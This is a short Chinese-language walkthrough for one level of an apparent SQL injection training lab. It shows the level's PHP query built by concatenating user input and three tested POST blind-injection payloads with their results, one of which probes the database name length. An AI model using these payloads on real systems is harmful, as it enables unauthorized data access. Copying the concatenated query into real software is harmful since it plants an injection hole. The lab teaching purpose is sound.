# Less-16

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 盲注 |
| **闭合方式** | `")` |
| **成败信号** | flag.jpg / slap.jpg |
| **一句话** | 同上 |
| **核心 payload** | `uname=admin") and length(database())=8--+` |

---

**POST · 布尔/时间盲注 · 双引号 + 括号**

### 源码

```php
$uname  = '"' . $uname  . '"';
$passwd = '"' . $passwd . '"';
$sql = "SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

闭合用 **`")`**。

### 通关 payload（实测）

```
uname = admin") --+                          →  flag.jpg
uname = admin") and 1=2--+                   →  slap.jpg
uname = admin") and length(database())=8--+  →  flag.jpg  （真）
```

---

[← Less-15](Less-15.md) ｜ [返回目录](README.md) ｜ [Less-17 →](Less-17.md)